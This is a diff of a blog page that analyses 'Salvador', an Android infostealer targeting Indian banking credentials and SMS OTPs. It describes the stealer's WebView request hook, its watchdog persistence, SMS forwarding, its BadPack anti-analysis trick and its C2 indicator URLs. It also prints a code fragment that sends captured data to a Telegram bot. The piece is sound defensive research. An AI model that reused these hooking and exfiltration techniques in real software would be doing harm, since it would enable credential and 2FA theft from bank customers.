@@ -6,7 +6,7 @@
 <meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
 <meta name="robots" content="noindex, nofollow">
 <title>Salvador Stealer Analysis | YaxyZ&#39;s Blog</title>
-<meta name="keywords" content="">
+<meta name="keywords" content="infostealer, android, reversing, malware analysis">
 <meta name="description" content="
 Android Malware analysis
 Salvador Stealer - Android malware analysis
@@ -40,7 +40,7 @@ Overview
 The Salvador infostealer is an Android malware designed to intercept Indian banking credentials and OTP Tokens by hooking into the device web rendering engine. It utilizes modern Android APIs to remain persistent even when the user attempts to close the application. Additionally, it implements a custom SMS Broadcast receiver to catch live OTP tokens received by SMS which is then used by the malicious actor to impersonate the user.">
 <meta name="author" content="">
 <link rel="canonical" href="http://localhost:1313/posts/salvador-stealer-analysis/">
-<link crossorigin="anonymous" href="/assets/css/stylesheet.de53c6895643b27ff99bc9d4e97daf7c414a91bd9528fb369b52ac936b923e22.css" integrity="sha256-3lPGiVZDsn/5m8nU6X2vfEFKkb2VKPs2m1Ksk2uSPiI=" rel="preload stylesheet" as="style">
+<link crossorigin="anonymous" href="/assets/css/stylesheet.7d822f2e39eff36e4ade9c21d9811a73be4fe64923248a44c154226113c8e32d.css" integrity="sha256-fYIvLjnv825K3pwh2YEac75P5kkjJIpEwVQiYRPI4y0=" rel="preload stylesheet" as="style">
 <link rel="icon" href="http://localhost:1313/favicon.ico">
 <link rel="icon" type="image/png" sizes="16x16" href="http://localhost:1313/favicon-16x16.png">
 <link rel="icon" type="image/png" sizes="32x32" href="http://localhost:1313/favicon-32x32.png">
@@ -144,7 +144,7 @@ The Salvador infostealer is an Android malware designed to intercept Indian bank
     <h1 class="post-title entry-hint-parent">
       Salvador Stealer Analysis
     </h1>
-    <div class="post-meta"><span title='2026-04-15 19:43:22 +0300 IDT'>April 15, 2026</span>
+    <div class="post-meta"><span title='2026-04-15 00:00:00 +0000 UTC'>April 15, 2026</span>
 
 </div>
   </header> 
@@ -180,25 +180,25 @@ The Salvador infostealer is an Android malware designed to intercept Indian bank
 <h1 id="overview">Overview</h1>
 <p>The Salvador infostealer is an Android malware designed to intercept Indian banking credentials and OTP Tokens by hooking into the device web rendering engine. It utilizes modern Android APIs to remain persistent even when the user attempts to close the application. Additionally, it implements a custom SMS Broadcast receiver to catch live OTP tokens received by SMS which is then used by the malicious actor to impersonate the user.</p>
 <h3 id="1-entry-point-webview-injection">1. Entry Point: WebView Injection</h3>
-<p>The core of the theft occurs within an Android <strong>WebView</strong> (an in-app browser). The malware uses the js function <em>Eval</em> to inject a malicious payload that &ldquo;monkey patches&rdquo; the standard web environment.</p>
+<p>The core of the theft occurs within an Android <strong>WebView</strong> (an in-app browser). The malware uses the JS function <em>Eval</em> to inject a malicious payload that &ldquo;monkey patches&rdquo; the standard web environment.</p>
 <ul>
 <li><strong>The Hook:</strong> It overwrites the global <strong>XMLHttpRequest.prototype.send</strong> function. This is the primary method used by websites to send data (API calls, form submissions) to their servers.</li>
 <li><strong>The Interception:</strong> By sitting between the user and the legitimate server, the malware captures all <strong>POST</strong> data (passwords, cookies, session tokens) before it is encrypted by the website&rsquo;s standard HTTPS transmission.</li>
 </ul>
 <h3 id="2-persistence-the-unkillable-service">2. Persistence: The &ldquo;Unkillable&rdquo; Service</h3>
-<p>To ensure the theft continues indefinitely, the malware implements a watchdog mechanism using the <strong>Android WorkManager API</strong>.</p>
+<p>To ensure the malware continues to operate, it implements a watchdog mechanism using the <strong>Android WorkManager API</strong>.</p>
 <ul>
 <li><strong>Task Removal Trigger:</strong> The malware overrides the <strong>onTaskRemoved</strong> method. This is a specific lifecycle event triggered when a user &ldquo;swipes away&rdquo; the app from their recent tasks.</li>
 <li><strong>The 1-Second Loop:</strong> Instead of shutting down, the app schedules a <strong>OneTimeWorkRequest</strong> to restart its malicious services after a 1 second delay. This makes the malware effectively immune to manual termination by the user.</li>
 </ul>
 <h3 id="3-exfiltration-telegram-bot-api">3. Exfiltration: Telegram Bot API</h3>
-<p>Unlike older malware that required a complex Command &amp; Control server, this infostealer leverages the <strong>Telegram Bot API</strong> as its backend.</p>
+<p>Unlike older malware, this infostealer leverages the <strong>Telegram Bot API</strong> as itspart of its backend.</p>
 <ul>
 <li><strong>Stealthy Transmission:</strong> Using a hardcoded Bot Token and Chat ID, the malware sends the intercepted data as a standard JSON message to a private Telegram chat controlled by the attacker.</li>
 <li><strong>Network Obfuscation:</strong> Because Telegram is a legitimate service, this traffic often bypasses basic network firewalls and does not raise suspicion in standard data usage logs.</li>
 </ul>
 <h3 id="4-otp-interception-sms-forwarding">4. OTP Interception: SMS Forwarding</h3>
-<p>The malware implemented a mechanism to capture OTP authentication tokens received by the banking login 2FA. It uses a permission given by the user to utilize an sms broadcast receiver to capture received SMS’s.</p>
+<p>The malware implements a mechanism to capture OTP authentication tokens received by the banking login 2FA. It uses a permission given by the user to utilize an sms broadcast receiver to capture received SMSs.</p>
 <ul>
 <li><strong>Dual-Channel SMS Theft:</strong> The Trojan intercepts all incoming text messages. It simultaneously logs the full message history to the attacker’s web server via <strong>HTTP POST</strong> request and forwards the OTPs to a malicious phone number via SMS.</li>
 <li><strong>Dynamic Command &amp; Control:</strong> The malware is not static. it performs an <strong>HTTP GET</strong> request to an attacker controlled URL to retrieve a &ldquo;Master Phone Number&rdquo;. This allows the hacker to remotely change the destination of stolen codes without needing to reinfect the device, or even automate the process.</li>
@@ -239,12 +239,12 @@ The Salvador infostealer is an Android malware designed to intercept Indian bank
       <tr>
           <td>OTP interception 1</td>
           <td>URL</td>
-          <td><a href="https://t15.muletipushpa.cloud/post.php">https://t15.muletipushpa.cloud/post.php</a></td>
+          <td>https://t15[.]muletipushpa[.]cloud/post.php</td>
       </tr>
       <tr>
           <td>OTP interception 2</td>
           <td>URL</td>
-          <td>https://t15[.]muletipushpa[.]cloud/json/number[.]php</td>
+          <td>https://t15[.]muletipushpa[.]cloud/JSon/number[.]php</td>
       </tr>
   </tbody>
 </table>
@@ -253,7 +253,7 @@ The Salvador infostealer is an Android malware designed to intercept Indian bank
 <p>As part of the Static Analysis, I began using apktool and JADX to decompile the malware but I was met with a strange error:</p>
 <p><img loading="lazy" src="/images/image2.png"></p>
 <p>The following error <em>invalid CEN header (bad compression method)</em> Would not allow me to decompile the file.</p>
-<p>I found research conducted by Unit 421 - <em>‘Beware of BadPack: One Weird Trick Being Used Against Android Devices’</em> . Feel free to read their research and learn more about the technique.</p>
+<p>I found research conducted by Palo Alto Networks Unit 42 - <em>‘Beware of BadPack: One Weird Trick Being Used Against Android Devices’</em> . Feel free to read their research and learn more about the technique.</p>
 <p>In short, BadPack is an anti-analysis technique used by Android malware authors to intentionally corrupt APK (ZIP) headers. By mismatching compression methods or sizes between the Local File Header and the Central Directory File Header , malware breaks standard analysis pipelines, reverse-engineering tools, and ZIP parsers. However, the Android runtime ignores these anomalies and executes the malicious payload anyway.</p>
 <p>I tested it by throwing the  apk into HxD and inspected the hex bytes of the compression method to be 0xA307 (Unknown compression method).
 <img loading="lazy" src="/images/image11.png"></p>
@@ -337,7 +337,7 @@ The Salvador infostealer is an Android malware designed to intercept Indian bank
 </span></span><span style="display:flex;"><span>            <span style="color:#a6e22e">fetch</span>(<span style="color:#a6e22e">telegramUrl</span>, {
 </span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">method</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;POST&#39;</span>,
 </span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">headers</span><span style="color:#f92672">:</span> {
-</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#39;Content-Type&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;application/json&#39;</span>
+</span></span><span style="display:flex;"><span>                    <span style="color:#e6db74">&#39;Content-Type&#39;</span><span style="color:#f92672">:</span> <span style="color:#e6db74">&#39;application/JSon&#39;</span>
 </span></span><span style="display:flex;"><span>                },
 </span></span><span style="display:flex;"><span>                <span style="color:#a6e22e">body</span><span style="color:#f92672">:</span> <span style="color:#a6e22e">JSON</span>.<span style="color:#a6e22e">stringify</span>(<span style="color:#a6e22e">telegramMessage</span>),
 </span></span><span style="display:flex;"><span>            });
@@ -382,7 +382,7 @@ The Salvador infostealer is an Android malware designed to intercept Indian bank
 <h5 id="a-the-bradford-function-sms-forwarding">A. The Bradford Function (SMS Forwarding)</h5>
 <p>This function attempts to turn the victim&rsquo;s device into an automated SMS forwarder by the following order:</p>
 <ol>
-<li><strong>Dynamic number Fetching:</strong> It performs an HTTP GET request to <strong>https://t15[.]muletipushpa[.]cloud/json/number[.]php</strong> to retrieve the attacker phone number.</li>
+<li><strong>Dynamic number Fetching:</strong> It performs an HTTP GET request to <strong>https://t15[.]muletipushpa[.]cloud/JSon/number[.]php</strong> to retrieve the attacker phone number.</li>
 <li><strong>Configuration Storage:</strong> The returned phone number is saved in SharedPreferences under the file <strong>‘Salvador’</strong> with the key <strong>forwardingNumber</strong>.</li>
 <li><strong>Forwarding:</strong> The malware then uses the <strong>sendSMS()</strong> method to forward the stolen message directly to this attacker-controlled number.</li>
 </ol>
@@ -390,7 +390,7 @@ The Salvador infostealer is an Android malware designed to intercept Indian bank
 <p>Serving as a backup, this function ensures data is stolen even if a forwarding number cannot be reached. It operates as the following:</p>
 <ol>
 <li><strong>JSON Payload:</strong> It structures the collected Map data into a JSON object.</li>
-<li><strong>C2 Upload:</strong> It sends an HTTP POST request to <strong>https://t15[.]muletipushpa[.]cloud/post[.]php</strong> with the json object as the body.</li>
+<li><strong>C2 Upload:</strong> It sends an HTTP POST request to <strong>https://t15[.]muletipushpa[.]cloud/post[.]php</strong> with the JSon object as the body.</li>
 </ol>
 <h4 id="dynamic-analysis-validation">Dynamic Analysis Validation</h4>
 <p>To validate the malware behaviour I setup a virtual lab containing the following:</p>
@@ -434,6 +434,10 @@ The Salvador infostealer is an Android malware designed to intercept Indian bank
 
   <footer class="post-footer">
     <ul class="post-tags">
+      <li><a href="http://localhost:1313/tags/infostealer/">Infostealer</a></li>
+      <li><a href="http://localhost:1313/tags/android/">Android</a></li>
+      <li><a href="http://localhost:1313/tags/reversing/">Reversing</a></li>
+      <li><a href="http://localhost:1313/tags/malware-analysis/">Malware Analysis</a></li>
     </ul>
   </footer>
 </article>
